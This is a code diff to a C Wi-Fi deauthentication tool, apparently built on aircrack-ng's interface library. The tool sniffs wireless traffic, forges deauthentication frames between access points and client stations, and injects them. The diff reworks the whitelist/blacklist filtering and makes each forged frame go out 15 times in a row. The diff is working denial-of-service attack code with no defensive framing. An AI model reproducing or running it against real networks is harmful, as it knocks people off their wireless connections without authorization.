@@ -16,7 +16,7 @@ static struct wif *_wi_in, *_wi_out;
 
 int current_channel = 0;
 
-int use_list = 0;                       // Flag for using list [0->nolist| 1->whitelist| 2->blacklist]
+int with_whitelist = 0;
 
 uchar mac_list[MAX_MAC_LIST_ENTRIES][MAC_LENGTH];           // Whitelist/Blacklist
 int mac_list_length = 0;                                    // Actual mac_list length
@@ -26,27 +26,6 @@ struct packet
     uchar *data;
     int length;
 } packet;
-
-int send_packet(uchar *buf, size_t count)
-{
-    printf("\nsending_packet\n");
-    //print_packet(buf, count);
-    struct wif *wi = _wi_out; /* XXX */
-    if (wi_write(wi, buf, count, NULL) == -1) {
-        switch (errno) {
-        case EAGAIN:
-        case ENOBUFS:
-            usleep(10000);
-
-            return 0;
-        }
-        perror("wi_write()");
-
-        return -1;
-    }
-
-    return 0;
-}
 
 int read_packet(uchar *buffer, size_t buffer_size)
 {
@@ -184,6 +163,27 @@ struct packet create_deauth_frame(uchar *mac_source, uchar *mac_destination, uch
     print_mac(mac_bssid);
     printf("\n-------------------------------\n");
     return result_packet;
+}
+
+int send_packet(uchar *buf, size_t count)
+{
+    printf("\nsending_packet\n");
+    print_packet(buf, count);
+    struct wif *wi = _wi_out; /* XXX */
+    if (wi_write(wi, buf, count, NULL) == -1) {
+        switch (errno) {
+        case EAGAIN:
+        case ENOBUFS:
+            usleep(10000);
+
+            return 0;
+        }
+        perror("wi_write()");
+
+        return -1;
+    }
+
+    return 0;
 }
 
 
@@ -392,7 +392,7 @@ void load_list_file(const char *filename)
 
         if ((unsigned int) mac_list_length >= sizeof (mac_list) / sizeof (mac_list[0]))
         {
-            fprintf(stderr, "Exceeded max whitelist entries\n");
+            fprintf(stderr, "Exceeded max with_whitelist entries\n");
             exit(1);
         }
     }
@@ -424,13 +424,6 @@ uchar *get_target_deauth(uchar *bssid)
     {
         packet_length = 0;
         do {
-            /*int to_print = 0;*/
-            /*if (*/
-                /*memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH) &&*/
-                /*memcmp(mac_list[0], get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH)*/
-            /*) {*/
-                /*to_print = 1;*/
-            /*}*/
 
             packet_length = read_packet(sniffed_packet, MAX_PACKET_LENGTH);
 
@@ -478,12 +471,10 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
 
         if (
-                (use_list == 1 && is_in_list(mac_access_point) && is_in_list(mac_station))
-                ||
-                (use_list == 2 && !(is_in_list(mac_access_point) || is_in_list(mac_station)))
-            )
-        {
-                continue;
+            (with_whitelist == 1 && (is_in_list(mac_access_point) || is_in_list(mac_station))) ||
+            (with_whitelist == 0 && !(is_in_list(mac_access_point) || is_in_list(mac_station)))
+        ) {
+            continue;
         }
         break;
     }
@@ -498,6 +489,9 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
     print_mac(mac_access_point);
     printf("mac_station: ");
     print_mac(mac_station);
+
+    int counter = 0;
+
     switch (*state)
     {
     case 0:
@@ -506,6 +500,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
 
         *state = 1;
         result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 1);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     case 1:
@@ -517,6 +512,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
             *state = 4;
         }
         result_packet = create_deauth_frame(mac_access_point, mac_station, mac_bssid, 0);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     case 2:
@@ -524,6 +520,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         printf("\nis_wds: %d\n", is_wds);
         *state = 3;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 1);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     case 3:
@@ -531,6 +528,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         printf("\nis_wds: %d\n", is_wds);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_access_point, mac_bssid, 0);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     case 4:
@@ -538,6 +536,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         printf("\nis_wds: %d\n", is_wds);
         *state = 5;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 1);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     case 5:
@@ -545,6 +544,7 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
         printf("\nis_wds: %d\n", is_wds);
         *state = 0;
         result_packet = create_deauth_frame(mac_station, mac_bssid, mac_access_point, 0);
+        for (counter = 0; counter < 15; counter++)
         send_packet(result_packet.data, result_packet.length);
         printf("\nstate after: %d\n", *state);
     }
@@ -592,14 +592,13 @@ int main(int argc, const char *argv[])
     {
         if (!strcmp(argv[t], "-w") && argc >= t+1)
         {
-            use_list = 1;
+            with_whitelist = 1;
             list_file = argv[t+1];
             load_list_file(list_file);
         }
-
-        if (!strcmp(argv[t], "-b") && argc >= t+1)
+        else if (!strcmp(argv[t], "-b") && argc >= t+1)
         {
-            use_list = 2;
+            with_whitelist = 2;
             list_file = argv[t+1];
             load_list_file(list_file);
         }
@@ -619,6 +618,18 @@ int main(int argc, const char *argv[])
         }
     }
 
+    if (with_whitelist)
+    {
+        if (with_whitelist == 2) {
+            with_whitelist = 0;
+        }
+    }
+    else
+    {
+        print_help();
+        return 1;
+    }
+
     /* open the replay interface */
     _wi_out = wi_open((char*) argv[1]);
     if (!_wi_out)
@@ -630,21 +641,18 @@ int main(int argc, const char *argv[])
     /* drop privileges */
     setuid(getuid());
 
-    if (use_list > 0)
+    if (with_whitelist == 1)
     {
-        if (use_list == 1)
-        {
-            printf("blacklist:\n");
-        } else if (use_list == 2)
-        {
-            printf("whitelist:\n");
-        }
+        printf("with_whitelist:\n");
+    } else
+    {
+        printf("blacklist:\n");
+    }
 
-        int i = 0;
-        for (i = 0; i < mac_list_length; i++)
-        {
-            print_mac(mac_list[i]);
-        }
+    int i = 0;
+    for (i = 0; i < mac_list_length; i++)
+    {
+        print_mac(mac_list[i]);
     }
 
     /* Run Forest, run... */
